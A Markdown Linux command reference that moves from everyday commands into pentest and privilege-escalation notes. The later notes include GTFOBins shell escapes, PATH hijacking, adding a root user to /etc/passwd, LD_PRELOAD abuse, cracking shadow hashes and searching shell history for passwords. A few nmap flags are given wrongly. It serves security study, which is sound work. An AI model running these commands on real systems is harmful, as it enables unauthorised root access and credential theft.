# Linux Reference – Core Commands

---

## Table of Contents

1. [🗂️ Navigation & Files](#navigation--files)
2. [🔧 Shell Operators](#shell-operators)
3. [✏️ Text Editors](#text-editors)
4. [🔍 Search & Text Processing](#search--text-processing)
5. [🔤 Encoding & Encoding Tools](#encoding--encoding-tools)
6. [🗜️ Compression & Archives](#compression--archives)
7. [🌐 Network & Transfer](#network--transfer)
8. [⚙️ Processes & System](#processes--system)
9. [📦 Package Management](#package-management)
10. [⏰ Automation](#automation)
11. [🔑 Linux Permissions](#linux-permissions)
12. [🔨 Bash Scripting](#bash-scripting)
13. [🔐 Security & Exploitation Tools](#security--exploitation-tools)
14. [🔓 Privilege Escalation](#privilege-escalation)

---

## 🗂️ Navigation & Files

### `echo`
Displays text or the value of a variable in the terminal.

```bash
echo Hello
echo "Hello world"
echo $HOME
```

---

### `whoami`
Displays the username of the currently logged-in user.

```bash
whoami
```

---

### `ls`
Lists files and directories in the current (or specified) directory.

```bash
ls
ls -l      # long format (permissions, owner, size, date)
ls -a      # show hidden files (dot files)
ls -lh     # long format with human-readable sizes
ls -la     # long format + hidden files
```

---

### `cat`
Displays the content of a file directly in the terminal.
Best suited for small files.

```bash
cat file.txt
cat ./-                      # file whose name is a dash
cat "./file with spaces"     # file whose name contains spaces
```

For large files, use `less` or `head`/`tail`:

```bash
less file.txt
head -n 20 file.txt     # first 20 lines
tail -n 20 file.txt     # last 20 lines
tail -f /var/log/syslog  # follow a log file in real time
```

---

### `cd`
Changes the current working directory.

```bash
cd folder
cd ..
cd /absolute/path
```

---

### `pwd`
Prints the absolute path of the current working directory.

```bash
pwd
```

---

### `mkdir`
Creates a new directory.

```bash
mkdir new_folder
mkdir -p parent/child/grandchild    # create nested directories in one shot
```

---

### `touch`
Creates a new empty file or updates its timestamp if it already exists.

```bash
touch file.txt
```

---

### `cp`
Copies files or directories.

```bash
cp file.txt backup.txt
cp -r folder/ backup_folder/
```

---

### `mv`
Moves or renames files and directories.

```bash
mv file.txt /home/user/
mv old.txt new.txt
```

---

### `rm`
Removes files or directories.

```bash
rm file.txt
rm -r folder/
```

> ⚠️ `rm -rf` can be destructive if misused.

---

### `file`
Determines the type of a file (text, binary, gzip, bzip2, tar…).

```bash
file document.txt
file ./*          # check all files in current directory
```

---

### `man`
Opens the manual page for a command.

```bash
man ls
man find
man chmod
```

> Always check `man` before Googling — the answer is usually there.

---

### `clear`
Clears the terminal screen.

```bash
clear
```

---

### `id`
Displays the current user's UID, GID, and group memberships.

```bash
id
id username
```

---

### `uname`
Displays system information (kernel, architecture, hostname).

```bash
uname -a         # all info: kernel, hostname, architecture, OS
uname -r         # kernel version only
uname -m         # architecture (x86_64, etc.)
```

---

### `history`
Displays the shell command history for the current user.

```bash
history
history | grep "ssh"
cat ~/.*history | less          # read all history files
cat ~/.*history | grep -i 'pass\|mysql\|ssh'   # search for credentials
```

---

### `date`
Displays the current system date and time. Supports custom output formatting.

```bash
date                       # full date and time
date +"%Y-%m-%d"           # formatted: 2026-02-26
date +"%H:%M:%S"           # time only: 14:35:00
```

The `+` prefix defines a custom format using strftime-style specifiers.

---

### `basename`
Returns the last component of a path — the filename or directory name without the leading path.

```bash
basename /home/user/docs/report.txt    # → report.txt
basename /home/user/docs/              # → docs
```

Useful in scripts to extract a clean name from a full path.

---

## 🔧 Shell Operators

Operators control how commands interact with each other and with files.

| Operator | Name | Description |
|----------|------|-------------|
| `\|` | Pipe | Pass the output of one command as input to another |
| `>` | Redirect | Write output to a file (overwrites) |
| `>>` | Append | Append output to a file |
| `&` | Background | Run a command in the background |
| `&&` | And | Run the second command only if the first succeeds |

Examples:

```bash
ls -la | grep ".txt"          # pipe: filter ls output
echo "hello" > file.txt       # redirect: write to file
echo "world" >> file.txt      # append: add to file
sleep 10 &                    # background: run without blocking
apt update && apt upgrade     # and: update then upgrade
```

---

## ✏️ Text Editors

### `nano`
Terminal-based text editor — simple and beginner-friendly.

```bash
nano file.txt
```

Keyboard shortcuts:

| Shortcut   | Action  |
|------------|---------|
| `CTRL + O` | Save    |
| `CTRL + X` | Exit    |

---

### `vim`
Powerful modal text editor — steep learning curve but extremely versatile.

```bash
vim file.txt
```

| Mode     | Key         | Description                     |
|----------|-------------|---------------------------------|
| Normal   | `Esc`       | Default mode — navigate/command |
| Insert   | `i`         | Enter insert mode (type text)   |
| Command  | `:`         | Enter command line              |

Essential commands:

| Command    | Action                          |
|------------|---------------------------------|
| `:w`       | Save                            |
| `:q`       | Quit                            |
| `:wq`      | Save and quit                   |
| `:q!`      | Quit without saving             |
| `:!/bin/sh`| Escape to shell (GTFOBins)      |
| `-c ':!/bin/sh'` | Execute shell on startup (GTFOBins) |

---

## 🔍 Search & Text Processing

### `find`
Searches for files and directories recursively.

```bash
find / -name "*.txt"
find / -type f -name "secret"
find / -type f -user bob -group dev -size 33c 2>/dev/null
find / -type f -size 1033c ! -executable 2>/dev/null
find / -perm -u=s -type f 2>/dev/null          # find all SUID binaries
find . -exec /bin/sh \; -quit                   # spawn a shell (GTFOBins)
```

| Flag | Description |
|------|-------------|
| `-type f` | Files only |
| `-type d` | Directories only |
| `-name` | Match by name |
| `-user` | Match by owner |
| `-group` | Match by group |
| `-size Nc` | Match by size in bytes |
| `-perm -4000` | Match files with SUID bit set |
| `-perm -u=s` | Match files with SUID bit set (alternative) |
| `! -executable` | Exclude executable files |
| `-exec CMD {} \;` | Execute a command on each match |

> `2>/dev/null` suppresses permission error output.

---

### `grep`
Searches for a specific pattern inside files.

```bash
grep "admin" file.txt
grep -r "admin" /path
grep -i "admin" file.txt
grep -n "admin" file.txt
grep -v "admin" file.txt
grep -E "error|warning" file.txt
grep -o "[0-9]\+" file.txt
```

| Flag | Description                           |
|------|---------------------------------------|
| `-r` | Recursive search                      |
| `-c` | Count matching lines                  |
| `-i` | Case-insensitive search               |
| `-n` | Show line numbers                     |
| `-v` | Invert — show lines that do NOT match |
| `-E` | Extended regex (alternation, `+`, `?`, etc.) |
| `-o` | Print only the matched part, not the whole line |

---

### `awk`
Pattern-based text processing tool — splits input into fields and applies actions.

```bash
awk '{print $1}' file.txt                # print first field of each line
awk -F: '{print $1}' /etc/passwd         # use : as delimiter, print usernames
awk '/error/ {print $0}' log.txt         # print lines matching "error"
awk 'BEGIN {system("/bin/sh")}'          # spawn a shell (GTFOBins)
```

| Flag   | Description                          |
|--------|--------------------------------------|
| `-F`   | Set the field delimiter              |
| `$0`   | Entire line                          |
| `$1`   | First field                          |
| `$NF`  | Last field                           |

---

### `cut`
Extracts specific fields from lines based on a delimiter.

```bash
cut -d ' ' -f 1 file.txt        # extract first field, space-delimited
echo "a b c" | cut -d ' ' -f 2  # → b
md5sum file | cut -d ' ' -f 1   # extract only the hash
```

| Flag | Description                      |
|------|----------------------------------|
| `-d` | Delimiter character              |
| `-f` | Field number to extract (1-based)|

---

### `sort`
Sorts lines in a file alphabetically (or numerically).

```bash
sort file.txt
sort -u file.txt          # sort and remove duplicates
sort -n file.txt          # sort numerically
sort -r file.txt          # reverse order
sort file.txt | uniq -u   # pipeline: keep only unique lines
```

| Flag | Description                     |
|------|---------------------------------|
| `-u` | Sort and remove duplicates      |
| `-n` | Numeric sort                    |
| `-r` | Reverse order                   |

---

### `uniq`
Filters or counts duplicate lines. Usually combined with `sort`.

```bash
sort file.txt | uniq       # remove duplicates
sort file.txt | uniq -u    # keep only unique lines
sort file.txt | uniq -c    # count occurrences of each line
```

| Flag | Description                    |
|------|--------------------------------|
| `-u` | Print only unique lines        |
| `-c` | Prefix each line with a count  |

---

### `wc`
Counts lines, words, or characters in a file.

```bash
wc file.txt          # lines, words, characters
wc -l file.txt       # count lines only
wc -w file.txt       # count words only
cat file.txt | wc -l # count lines via pipe
```

---

### `strings`
Extracts human-readable strings from a binary file.

```bash
strings binary_file
strings data.txt | grep "="    # extract and filter
```

---

## 🔤 Encoding & Encoding Tools

### `md5sum`
Computes the MD5 hash of a file or input string.

```bash
md5sum file.txt
echo "I am user bandit23" | md5sum
echo "I am user bandit23" | md5sum | cut -d ' ' -f 1    # hash only
```

---

### `base64`
Encodes or decodes base64 data.

```bash
base64 file.txt          # encode
base64 -d file.txt       # decode
```

---

### `tr`
Translates or replaces characters in a stream.

```bash
tr 'A-Za-z' 'N-ZA-Mn-za-m'                    # ROT13
tr 'a-z' 'A-Z'                                 # lowercase to uppercase
cat file.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'     # ROT13 via pipe
```

---

### `xxd`
Creates a hex dump of a file, or reverses one back to binary.

```bash
xxd file                   # display hex dump
xxd -r hexdump > binary    # rebuild binary from hex dump
```

---

## 🗜️ Compression & Archives

### `gzip` / `gunzip`
Compresses or decompresses `.gz` files.

```bash
gzip file.txt              # compress → file.txt.gz
gunzip file.gz             # decompress
gzip -d file.gz            # decompress (alternative)
gunzip -c file.gz > output # decompress to stdout
```

---

### `bzip2` / `bunzip2`
Compresses or decompresses `.bz2` files.

```bash
bzip2 file.txt             # compress → file.txt.bz2
bunzip2 file.bz2           # decompress
bzip2 -d file.bz2          # decompress (alternative)
bzip2 -dc file.bz2 > output
```

---

### `tar`
Archives multiple files into a single `.tar` file.

```bash
tar tf archive.tar               # list contents
tar xf archive.tar               # extract
tar czf archive.tar.gz folder/   # create compressed archive
```

| Flag | Description              |
|------|--------------------------|
| `t`  | List contents            |
| `x`  | Extract                  |
| `c`  | Create archive           |
| `f`  | Specify filename         |
| `z`  | Use gzip compression     |

---

## 🌐 Network & Transfer

### `su`
Switches to another user account.

```bash
su username
su -l username
```

`-l` provides a full login shell environment.

---

### `ssh`
Connects to a remote machine over a network.

```bash
ssh user@hostname
ssh user@192.168.1.10
ssh user@host -p 2220              # specify port
ssh -i keyfile user@host -p 2220   # authenticate with private key
```

---

### `scp`
Securely copies files between machines over SSH.

```bash
scp file.txt user@192.168.1.10:/path/        # send
scp user@192.168.1.10:/path/file.txt .       # receive
scp -P 2220 user@host:file.txt .             # specify port
```

---

### `wget`
Downloads files from a URL.

```bash
wget http://example.com/file.txt
```

---

### `curl`
Transfers data from or to a server. Supports HTTP, HTTPS, FTP, and more.

```bash
curl http://example.com                  # GET request, output to stdout
curl -o file.html http://example.com     # save output to file
curl -I http://example.com               # fetch headers only
curl -X POST -d "key=value" http://url   # POST request with data
curl -s http://example.com               # silent mode (no progress bar)
```

| Flag  | Description                     |
|-------|---------------------------------|
| `-o`  | Write output to file            |
| `-I`  | Fetch HTTP headers only         |
| `-X`  | Specify HTTP method             |
| `-d`  | Send data (POST body)           |
| `-s`  | Silent mode                     |
| `-L`  | Follow redirects                |

---

### `nc` (Netcat)
Opens raw TCP/UDP connections. Useful for interacting with services directly.

```bash
nc host port              # connect to a host on a port
nc localhost 30000        # connect to a local service
nc -l -p 1234             # listen on port 1234 (TCP server mode)
nc -lvnp 1234             # verbose listener, no DNS resolution
echo "data" | nc -l -p 1234 &   # serve data in background
```

| Flag  | Description                                    |
|-------|------------------------------------------------|
| `-l`  | Listen mode (TCP server)                       |
| `-p`  | Specify port number                            |
| `-n`  | Numeric only — skip DNS resolution             |
| `-v`  | Verbose output                                 |
| `-vv` | Very verbose output                            |
| `-k`  | Keep listening after client disconnects        |

> Port < 1024 requires root to listen on.

---

### `openssl s_client`
Connects to a host using SSL/TLS. Required when the service does not accept plaintext.

```bash
openssl s_client -connect localhost:30001
openssl s_client -connect localhost:30001 -ign_eof
```

`-ign_eof` prevents the connection from closing when stdin reaches EOF — necessary when piping input.

---

### `nmap`
Scans hosts and port ranges to identify open services and their versions.

```bash
nmap host                            # default scan
nmap -p 31000-32000 localhost        # scan a specific port range
nmap -p- localhost                   # scan all 65535 ports
nmap --top-ports 20 host            # scan the 20 most common ports
nmap -sn 192.168.1.0/24            # ping sweep — discover active hosts, no port scan
```

#### Scan types

| Flag  | Type                      | Description                                           |
|-------|---------------------------|-------------------------------------------------------|
| `-sT` | TCP Connect               | Full Three-Way Handshake — noisier, no root needed    |
| `-sS` | SYN Half-open             | Most popular — never completes handshake, requires root |
| `-sU` | UDP                       | Slower — no handshake, port marked open\|filtered if no response |
| `-sN` | NULL                      | No flags set — firewall evasion, unreliable on Windows |
| `-sF` | FIN                       | FIN flag only — firewall evasion                      |
| `-sX` | Xmas                      | PSH+URG+FIN flags — firewall evasion                  |

#### Detection & output flags

```bash
nmap -sV host                        # service version detection
nmap -o host                         # OS detection
nmap -v host                         # verbose output
nmap -vv host                        # very verbose (recommended)
nmap -oA output host                 # output in all 3 formats
nmap -oN output.txt host             # normal output to file
nmap -oG output.gnmap host          # grepable output
nmap -a host                         # aggressive mode
nmap -T4 host                        # timing template (0-5, higher = faster = noisier)
```

#### NSE (Nmap Scripting Engine)

```bash
nmap --script vuln host              # run all vuln scripts
nmap --script ftp-anon host          # run a specific script
nmap --script=safe host              # run all safe scripts
```

Script categories: `safe`, `intrusive`, `vuln`, `exploit`, `auth`, `brute`, `discovery`

#### Firewall evasion

```bash
nmap -Pn host                        # skip ping — useful when ICMP is blocked
nmap -f host                         # fragment packets (smaller pieces)
nmap --mtu 16 host                   # custom MTU (must be multiple of 8)
nmap --scan-delay 200ms host         # delay between packets
nmap --badsum host                   # invalid checksum to detect firewall
nmap --data-length 25 host           # append random data to packets
```

---

### `telnet`
Opens a raw TCP connection to any port. Must manually speak the target protocol after connecting.

```bash
telnet <IP> 80         # connect to port 80 (HTTP)
telnet <IP> 25         # connect to port 25 (SMTP)
telnet <IP> 110        # connect to port 110 (POP3)
```

After connecting, send the appropriate protocol command:

| Port | Protocol | Command to send          |
|------|----------|--------------------------|
| 80   | HTTP     | `GET / HTTP/1.0` + Enter×2 |
| 25   | SMTP     | `EHLO domain`            |
| 110  | POP3     | `USER username`          |

The server response headers reveal the service name and version (`Server: nginx/1.6.2`). This technique is called **banner grabbing**.

---

### `nslookup`
Queries DNS servers to resolve domain names and retrieve DNS records.

```bash
nslookup domain.com                        # standard A record lookup
nslookup -type=A domain.com               # IPv4 address
nslookup -type=AAAA domain.com            # IPv6 address
nslookup -type=MX domain.com             # mail servers
nslookup -type=MX domain.com 1.1.1.1     # MX records via specific DNS server
nslookup -type=TXT domain.com            # TXT records
nslookup -type=CNAME domain.com          # canonical name
```

DNS record types:

| Type  | Result              |
|-------|---------------------|
| A     | IPv4 Addresses      |
| AAAA  | IPv6 Addresses      |
| CNAME | Canonical Name      |
| MX    | Mail Servers        |
| SOA   | Start of Authority  |
| TXT   | TXT Records         |

---

### `diff`
Compares two files line by line and shows differences.

```bash
diff file1.txt file2.txt
```

Output convention: `<` = line from the first file, `>` = line from the second file.

---

### `ping`
Sends ICMP echo requests to test whether a host is reachable.

```bash
ping hostname
ping 8.8.8.8
ping -4 hostname          # force IPv4 only
ping -i 0.5 hostname      # set interval between packets (seconds)
ping -v hostname          # verbose output
```

| Flag | Description                        |
|------|------------------------------------|
| `-4` | Force IPv4 requests only           |
| `-i` | Set interval between pings         |
| `-s` | Set ICMP data payload size (bytes) |
| `-v` | Verbose output                     |

> ICMP header is 8 bytes. Windows Firewall blocks ping by default.

---

### `traceroute`
Maps the path packets take to reach a destination by recording each hop.

```bash
traceroute hostname
traceroute -i eth0 hostname   # specify the network interface
traceroute -T hostname        # use TCP SYN instead of default UDP
```

Uses the Internet layer (IP) by default.

| Flag | Description                   |
|------|-------------------------------|
| `-i` | Specify network interface     |
| `-T` | Use TCP SYN packets           |

---

### `whois`
Queries domain registration information and IP address ownership.

```bash
whois example.com
whois 8.8.8.8
```

---

### `dig`
Manually queries DNS servers to resolve domain names.

```bash
dig example.com                   # standard DNS lookup
dig example.com @8.8.8.8          # query a specific DNS server
dig -x 8.8.8.8                    # reverse DNS lookup
```

Key sections in the output:

| Section | Description                              |
|---------|------------------------------------------|
| ANSWER  | The resolved IP address                  |
| TTL     | Cache duration in seconds before refresh |

---

### `python3`
Runs Python scripts or starts an interactive interpreter.

```bash
python3 script.py                                          # run a script
python3 scanner.py --host 10.10.1.1 --start 1 --end 1024  # pass CLI arguments (argparse)
python3 -c "import hashlib; print(hashlib.md5(b'test').hexdigest())"  # one-liner
```

#### `python3 -m http.server`
Starts a simple HTTP server in the current directory. Useful for transferring files between machines.

```bash
python3 -m http.server          # serve on port 8000
python3 -m http.server 9000     # serve on custom port
```

Then fetch from another machine:

```bash
wget http://<ip>:8000/file.txt
```

---

## ⚙️ Processes & System

### `ps`
Displays running processes.

```bash
ps
ps aux
```

---

### `top`
Displays real-time process statistics (CPU, memory, PID).

```bash
top
```

---

### `kill`
Sends signals to processes.

```bash
kill PID       # SIGTERM – graceful stop
kill -9 PID    # SIGKILL – forced stop
```

---

### `systemctl`
Manages system services.

```bash
systemctl start apache2
systemctl stop apache2
systemctl enable apache2       # auto-start on boot
systemctl disable apache2
systemctl status apache2
systemctl is-active apache2    # returns "active" or "inactive"
```

---

### Job Control

Suspend a running process:

```bash
CTRL + Z
```

Resume in the background:

```bash
bg
```

Resume in the foreground:

```bash
fg
```

---

## 📦 Package Management

### `apt`
Package manager for Debian-based systems (Ubuntu, Kali, etc.).

```bash
sudo apt update                    # refresh package list
sudo apt upgrade                   # upgrade installed packages
sudo apt install package_name      # install a package
```

---

### `pip` / `pip3`
Python package manager. Installs third-party libraries from PyPI.

```bash
pip install requests               # install a package
pip install paramiko scapy         # install multiple packages
pip install -r requirements.txt    # install from a requirements file
pip list                           # list installed packages
pip show requests                  # show package details
```

Common pentest libraries:

| Package  | Usage                                |
|----------|--------------------------------------|
| requests | HTTP requests (directory enumeration, web scraping) |
| paramiko | SSH connections (brute force)         |
| scapy    | Network packet crafting (ARP, ICMP)  |
| hashlib  | Built-in — hash generation (MD5, SHA-256) |
| pwntools | CTF & exploit development            |

---

## ⏰ Automation

### `cron`
Schedules recurring tasks.

Edit the crontab:

```bash
crontab -e
```

Cron format:

```
* * * * * command
│ │ │ │ │
│ │ │ │ └── day of week  (0–7, 0 and 7 = Sunday)
│ │ │ └──── month        (1–12)
│ │ └────── day of month (1–31)
│ └──────── hour         (0–23)
└────────── minute       (0–59)
```

---

## 🔑 Linux Permissions

### `chown`
Changes the owner (and optionally the group) of a file or directory.

```bash
chown user file.txt
chown user:group file.txt
chown -R user folder/       # recursive
```

---

### `chmod`
Changes the permissions of a file or directory.

```bash
chmod 750 file.txt
chmod 400 keyfile      # read-only for owner (SSH private keys)
chmod +x script.sh     # add execute permission
```

---

Permissions are structured across three levels:

| Level      | Description                        |
|------------|------------------------------------|
| **Owner**  | The user who owns the file         |
| **Group**  | Members of the associated group    |
| **Others** | Every other user                   |

Numeric values:

| Permission      | Value |
|-----------------|-------|
| `r` (read)      | 4     |
| `w` (write)     | 2     |
| `x` (execute)   | 1     |

Example — `chmod 750 file.txt`:

| Level  | Permissions | Value |
|--------|-------------|-------|
| Owner  | `rwx`       | 7     |
| Group  | `r-x`       | 5     |
| Others | `---`       | 0     |

### On files

| Permission | Meaning           |
|------------|-------------------|
| `r`        | Read file content |
| `w`        | Modify file       |
| `x`        | Execute file      |

### On directories

| Permission | Meaning                               |
|------------|---------------------------------------|
| `r`        | List directory contents               |
| `x`        | Enter / traverse directory            |
| `w`        | Create or delete files inside         |

---

## 🔨 Bash Scripting

### `seq`
Generates a sequence of numbers.

```bash
seq 5             # 1 2 3 4 5
seq 0 9999        # 0 to 9999
seq 1 2 10        # 1 3 5 7 9  (step of 2)
```

Commonly used in loops for brute force or iteration:

```bash
for i in $(seq 0 9999); do echo "input $i"; done | nc localhost 30002
```

---

### `printf`
Formats and prints data — more powerful than `echo` for precise formatting.

```bash
printf '%04d\n' 7        # → 0007
printf '%s %04d\n' "abc" 42
```

| Format | Description                        |
|--------|------------------------------------|
| `%d`   | Integer                            |
| `%04d` | Integer, padded to 4 digits with zeros |
| `%s`   | String                             |
| `%f`   | Float                              |

---

### `export`
Sets an environment variable and makes it available to child processes.

```bash
export VAR=value
export PATH=/tmp/mydir:$PATH    # prepend a directory to PATH
```

Used in PATH Hijacking — prepending a custom directory to `$PATH` forces the shell to find fake binaries before real ones.

---

### Shebang

The shebang must be alone on the first line and tells the OS which interpreter to run the script with.

```bash
#!/usr/bin/env bash
```

`/usr/bin/env bash` is more portable than `#!/bin/bash` — it resolves `bash` via `PATH` instead of assuming a fixed location.

---

### Variables

Declare a variable without spaces around `=`. Reference it with `$VAR` (case-sensitive).

```bash
SOURCE="/path/to/dir"
echo "$SOURCE"
```

Always quote variables to handle paths with spaces:

```bash
cp -r "$SOURCE" "$DESTINATION"
```

Concatenate variables using `${}`:

```bash
BACKUP_NAME="${DIR_NAME}_${DATE}"
```

---

### Command Substitution

Store the output of a command in a variable:

```bash
DATE=$(date +"%Y-%m-%d")
DIR_NAME=$(basename "$SOURCE")
```

---

### Conditionals

```bash
if [ condition ]; then
    # commands
fi
```

Common condition flags:

| Flag | Meaning                        |
|------|--------------------------------|
| `-d` | Path exists and is a directory |
| `-f` | Path exists and is a file      |
| `-z` | String is empty                |
| `!`  | Negate the condition           |

Example — check that a directory exists before proceeding:

```bash
if [ ! -d "$SOURCE" ]; then
    echo "Error: source directory not found."
    exit 1
fi
```

---

### Exit Codes

Every command returns an exit code when it finishes.

| Code    | Meaning  |
|---------|----------|
| `0`     | Success  |
| Non-zero | Error   |

Use `exit` to terminate a script explicitly:

```bash
exit 0    # success
exit 1    # error
```

If a script finishes without an explicit `exit`, it returns the exit code of the last command.

---

### Copying Directories

```bash
cp -r "$SOURCE" "$DESTINATION"      # copies the directory itself
cp -r "$SOURCE"/* "$DESTINATION"    # copies only the contents
```

---

## 🔐 Security & Exploitation Tools

### `sudo`
Executes a command as another user (default: root). Requires the target user to be specified with `-u`.

```bash
sudo command
sudo -u username command
sudo -u app-admin /bin/cat /path/to/file
sudo -l                                  # list current user's sudo permissions
```

| Flag  | Description                                |
|-------|--------------------------------------------|
| `-u`  | Run as a specific user                     |
| `-l`  | List allowed (and forbidden) commands      |

The allowed commands per user are configured in `/etc/sudoers`.

---

### SUID Binaries

A binary with the SUID bit set runs with the **file owner's** privileges, regardless of who executes it.

```bash
ls -la ./binary    # look for 's' in owner permissions: -rwsr-xr-x
./binary command   # runs as the file owner
```

Identifying SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

---

### PATH Hijacking

If a SUID binary calls a command without an absolute path (e.g., `ls` instead of `/bin/ls`), the shell resolves it via `$PATH`. Prepending a custom directory allows substituting the real binary with a fake one.

```bash
mkdir /tmp/fake
echo -e '#!/bin/bash\ncat /path/to/secret' > /tmp/fake/ls
chmod +x /tmp/fake/ls
export PATH=/tmp/fake:$PATH
./vulnerable_suid_binary
```

---

## 🔓 Privilege Escalation

### PrivEsc Enumeration Checklist

Key files and commands to check during Linux privilege escalation:

```bash
uname -a                                           # kernel version, architecture
id && whoami                                       # current user and groups
sudo -l                                            # sudo permissions
cat /etc/passwd                                    # list all users
cat /etc/shadow                                    # password hashes (if readable)
cat /etc/crontab                                   # scheduled cron jobs
cat /etc/exports                                   # NFS shares configuration
cat ~/.*history | less                             # command history
ps aux                                             # running processes
find / -perm -u=s -type f 2>/dev/null             # SUID binaries
```

---

### `john` (John the Ripper)
Password cracking tool. Runs on the attacker's machine, not on the target.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt    # crack with wordlist
john --show hash.txt                                          # display cracked passwords
```

Extract a hash from `/etc/shadow`:

```bash
grep "root" /etc/shadow > hash.txt
```

---

### `mkpasswd`
Generates a password hash suitable for `/etc/shadow`.

```bash
mkpasswd -m sha-512 newpassword
```

---

### `openssl passwd`
Generates a password hash suitable for `/etc/passwd`.

```bash
openssl passwd newpassword
```

Inject a new root user into a world-writable `/etc/passwd`:

```bash
echo 'newroot:HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
su newroot
```

---

### `gcc`
Compiles C source code. Used in PrivEsc to build shared libraries or custom binaries.

```bash
gcc -o output source.c                                    # basic compilation
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so lib.c  # compile shared library
```

---

### `ldd`
Lists the shared libraries required by a binary.

```bash
ldd /usr/sbin/apache2
ldd /usr/bin/passwd
```

Used in LD_LIBRARY_PATH exploitation to identify which library to replace.

---

### `mount`
Mounts a filesystem or network share.

```bash
mount                                # list all mounted filesystems
mount /dev/sda1 /mnt                 # mount a local partition
mount -t nfs target:/share /mnt      # mount an NFS share
umount /mnt                          # unmount
```

Used in NFS `no_root_squash` exploitation — mount the share on the attacker machine as root.

---

### LD_PRELOAD / LD_LIBRARY_PATH

If `env_keep+=LD_PRELOAD` appears in `sudo -l` output, a shared library can be injected:

```bash
sudo LD_PRELOAD=/tmp/preload.so find
```

If `env_keep+=LD_LIBRARY_PATH` is set, replace a library used by an allowed sudo binary:

```bash
ldd /usr/sbin/apache2
sudo LD_LIBRARY_PATH=/tmp apache2
```

---

### GTFOBins — Sudo Exploitation

When `sudo -l` allows running a binary, check [GTFOBins](https://gtfobins.github.io) for shell escapes:

```bash
sudo find . -exec /bin/sh \; -quit
sudo vim -c ':!/bin/sh'
sudo awk 'BEGIN {system("/bin/sh")}'
sudo nmap --interactive              # then type !sh
sudo less /etc/passwd                # then type !/bin/sh
```
